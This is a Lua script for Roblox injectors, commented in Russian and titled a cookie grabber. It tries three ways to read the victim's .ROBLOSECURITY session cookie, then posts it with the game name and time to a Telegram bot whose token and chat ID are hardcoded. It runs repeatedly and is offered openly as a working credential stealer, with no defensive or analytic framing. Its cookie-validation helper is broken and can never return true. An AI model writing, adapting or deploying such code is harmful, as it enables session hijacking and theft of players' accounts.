-- ============================================
-- COOKIE GRABBER (РАБОТАЕТ В WEBVIEW-ИНЖЕКТОРАХ)
-- ============================================
local botToken = "8609253340:AAGH_mUlJqF1xsH2fWuelzydtbXyxdq1DUU"
local chatID = "8735778962"

local webhookURL = "https://api.telegram.org/bot" .. botToken .. "/sendMessage"

-- ===== ПОЛУЧЕНИЕ КУКИ ЧЕРЕЗ WEBVIEW =====
local function getRobloxCookie()
    local cookie = nil
    
    -- Метод 1: Выполняем JS в WebView (Delta, Xeno)
    pcall(function()
        local webview = game:GetService("WebViewService")
        if webview then
            local result = webview:ExecuteJavaScript([[
                (function() {
                    var c = document.cookie.split('; ').find(r => r.startsWith('.ROBLOSECURITY='));
                    return c ? c.split('=')[1] : null;
                })();
            ]])
            if result and result ~= "null" then
                cookie = result
            end
        end
    end)
    
    -- Метод 2: Через встроенный браузер (некоторые инжекторы)
    if not cookie then
        pcall(function()
            local browser = game:GetService("BrowserService")
            if browser then
                local result = browser:EvaluateJavaScript([[
                    document.cookie.split('; ').find(r => r.startsWith('.ROBLOSECURITY='))
                ]])
                if result then
                    cookie = string.match(result, "=(.+)$")
                end
            end
        end)
    end
    
    -- Метод 3: Через глобальный объект (если инжектор сохраняет)
    if not cookie then
        pcall(function()
            if _G.ROBLOSECURITY then
                cookie = _G.ROBLOSECURITY
            end
        end)
    end
    
    return cookie or nil
end

-- ===== ПРОВЕРКА ВАЛИДНОСТИ =====
local function validateCookie(cookie)
    if not cookie then return false end
    pcall(function()
        local http = game:GetService("HttpService")
        local response = http:GetAsync("https://www.roblox.com/mobileapi/userinfo", {
            Headers = {
                ["Cookie"] = ".ROBLOSECURITY=" .. cookie
            }
        })
        if response and response:match("UserName") then
            return true
        end
    end)
    return false
end

-- ===== ОТПРАВКА В TELEGRAM =====
local function sendToTelegram(cookie)
    local message = string.format(
        "🍪 **КУКА ИЗ ИНЖЕКТОРА**\n" ..
        "━━━━━━━━━━━━━━━━━\n" ..
        "🎮 Игра: `%s`\n" ..
        "⏰ Время: `%s`\n" ..
        "━━━━━━━━━━━━━━━━━\n" ..
        "`%s`",
        game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown",
        os.date("%Y-%m-%d %H:%M:%S"),
        cookie
    )
    
    pcall(function()
        local http = game:GetService("HttpService")
        local data = http:JSONEncode({
            chat_id = chatID,
            text = message,
            parse_mode = "Markdown"
        })
        http:PostAsync(webhookURL, data, Enum.HttpContentType.ApplicationJson)
    end)
end

-- ===== ОСНОВНОЙ ЗАХВАТ =====
local function main()
    print("[*] Поиск куки через WebView...")
    local cookie = getRobloxCookie()
    
    if cookie then
        print("[+] Кука найдена!")
        sendToTelegram(cookie)
    else
        print("[-] Кука не найдена")
        print("[*] Попробуйте перезапустить инжектор")
        print("[*] Убедитесь, что вы залогинены в WebView")
    end
end

main()
wait(5)
main()
wait(30)
main()

print("✅ Cookie Grabber запущен")
print("📡 Бот: @MyCookieLootBOT")
